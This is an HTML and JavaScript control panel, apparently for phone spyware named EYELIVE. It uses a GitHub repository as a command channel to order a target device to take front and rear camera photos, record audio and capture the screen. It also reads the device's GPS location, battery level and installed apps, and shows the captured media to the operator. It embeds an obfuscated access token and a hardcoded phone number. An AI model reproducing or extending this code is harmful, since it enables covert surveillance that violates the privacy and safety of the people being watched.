<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#fff;font-family:monospace;min-height:100vh}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid #ffd700}
        .header h1{color:#ffd700;font-size:1.5em;letter-spacing:3px}
        .container{max-width:500px;margin:0 auto;padding:20px}
        .card{background:#111;border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        input{width:100%;padding:15px;background:#000;border:1px solid #333;color:#fff;border-radius:10px;font-size:1.1em;text-align:center;margin:8px 0}
        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0;text-transform:uppercase}
        .btn-gold{background:#ffd700;color:#000}.btn-green{background:#00ff88;color:#000}.btn-red{background:#ff4400;color:#fff}
        .result{background:#000;border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;min-height:100px;font-size:.85em;color:#aaa;word-break:break-all;max-height:400px;overflow-y:auto}
        .result img{width:100%;border-radius:8px;margin:10px 0;cursor:pointer}
        .result audio{width:100%;margin:10px 0}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:5px}
        .online{background:#00ff88}.offline{background:#ff4444}
    </style>
</head>
<body>
<div class="header"><h1>EYELIVE</h1></div>
<div class="container">
    <div class="card" id="loginCard">
        <h2 style="color:#ffd700;margin-bottom:15px">🔍 Buscar Dispositivo</h2>
        <input type="text" id="deviceId" placeholder="ID do dispositivo (ex: ad921d604863)">
        <input type="text" id="numero" placeholder="Numero: 62996942287" value="62996942287">
        <button class="btn btn-gold" onclick="conectar()">🔗 Conectar</button>
        <p style="color:#888;font-size:.7em;text-align:center;margin-top:10px">O ID aparece quando o bot inicia no Termux</p>
    </div>
    <div class="card" id="mainCard" style="display:none">
        <h2 style="color:#ffd700;margin-bottom:15px" id="deviceTitle">📱 Dispositivo</h2>
        <div class="result" id="statusResult">Carregando...</div>
        <div class="grid">
            <button class="btn btn-green" onclick="comando('foto_frontal')">📸 Frontal</button>
            <button class="btn btn-green" onclick="comando('foto_traseira')">📸 Traseira</button>
            <button class="btn btn-red" onclick="comando('audio')">🎤 Audio 10s</button>
            <button class="btn btn-gold" onclick="comando('screenshot')">📱 Tela</button>
        </div>
        <button class="btn btn-gold" onclick="comando('status')">🔄 Atualizar</button>
    </div>
    <div class="result" id="mediaResult"></div>
</div>
<script>
function decToken(){
    var t="now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";var r="";
    for(var i=0;i<t.length;i++){
        var c=t[i];
        if(c.match(/[a-zA-Z]/)){var b=c===c.toUpperCase()?65:97;r+=String.fromCharCode((c.charCodeAt(0)-b-7+26)%26+b)}
        else{r+=c}
    }
    return r;
}
var T=decToken();
var DEVICE_ID='';
var REPO='gynbetfc/eyelive';
var CHECK_INTERVAL=null;

function hash(s){return s} // Usa o numero direto como ID
function getIdFromNumber(num){var h=0;for(var i=0;i<num.length;i++){h=((h<<5)-h)+num.charCodeAt(i);h|=0}return Math.abs(h).toString(16).substring(0,12)}

async function conectar(){
    var num=document.getElementById('numero').value.replace(/[^0-9]/g,'');
    if(!num){alert('Digite o numero!');return}
    DEVICE_ID=getIdFromNumber(num);
    
    document.getElementById('deviceTitle').textContent='📱 '+num+' ('+DEVICE_ID+')';
    document.getElementById('loginCard').style.display='none';
    document.getElementById('mainCard').style.display='block';
    
    carregarStatus();
    CHECK_INTERVAL=setInterval(carregarStatus,10000);
    localStorage.setItem('eyelive_num',num);
}

async function carregarStatus(){
    try{
        var h={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'};
        var url='https://api.github.com/repos/'+REPO+'/contents/dados/'+DEVICE_ID+'/status.json';
        var r=await fetch(url,{headers:h});
        if(r.ok){
            var d=await r.json();
            var status=JSON.parse(atob(d.content));
            var dot=status.time?'<span class="status-dot online"></span> Online':'<span class="status-dot offline"></span> Offline';
            document.getElementById('statusResult').innerHTML='<p>'+dot+' | 🕐 '+status.time+'</p><p>🔋 '+status.bateria+'</p><p>📍 '+JSON.stringify(status.gps)+'</p><p>📱 '+status.apps.join(', ')+'</p>';
        }else{
            document.getElementById('statusResult').innerHTML='<p><span class="status-dot offline"></span> Offline - Aguardando...</p>';
        }
    }catch(e){}
}

async function comando(cmd){
    try{
        var h={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'};
        var url='https://api.github.com/repos/'+REPO+'/contents/comandos/'+DEVICE_ID+'.json';
        var data={cmd:cmd,target:DEVICE_ID};
        var content=btoa(JSON.stringify(data));
        
        var check=await fetch(url,{headers:h});
        var body={message:'CMD',content:content,branch:'main'};
        if(check.ok)body.sha=(await check.json()).sha;
        await fetch(url,{method:'PUT',headers:h,body:JSON.stringify(body)});
        
        document.getElementById('mediaResult').innerHTML='⏳ Comando <b>'+cmd+'</b> enviado! Aguardando resposta...';
        
        // Aguardar resposta
        setTimeout(async function(){
            var files=await fetch('https://api.github.com/repos/'+REPO+'/contents/dados/'+DEVICE_ID,{headers:h});
            if(files.ok){
                var lista=await files.json();
                var respFile=null;
                lista.forEach(function(f){
                    if(f.name.includes(cmd)&&f.name.endsWith('.json'))respFile=f;
                });
                if(respFile){
                    var rd=await fetch(respFile.url,{headers:h});
                    var resp=JSON.parse(atob((await rd.json()).content));
                    showMedia(resp);
                }
            }
        },15000);
    }catch(e){document.getElementById('mediaResult').innerHTML='❌ Erro: '+e.message}
}

function showMedia(resp){
    var h='<p>✅ <b>'+resp.cmd+'</b> recebido!</p>';
    if(resp.result&&resp.result.length>100){
        if(resp.cmd.includes('foto')||resp.cmd.includes('screen')){
            h+='<img src="data:image/jpeg;base64,'+resp.result+'" onclick="window.open(this.src)">';
        }else if(resp.cmd=='audio'){
            h+='<audio controls src="data:audio/aac;base64,'+resp.result+'"></audio>';
        }
    }
    document.getElementById('mediaResult').innerHTML=h;
}

var saved=localStorage.getItem('eyelive_num');
if(saved){document.getElementById('numero').value=saved;}
</script>
</body>
</html>
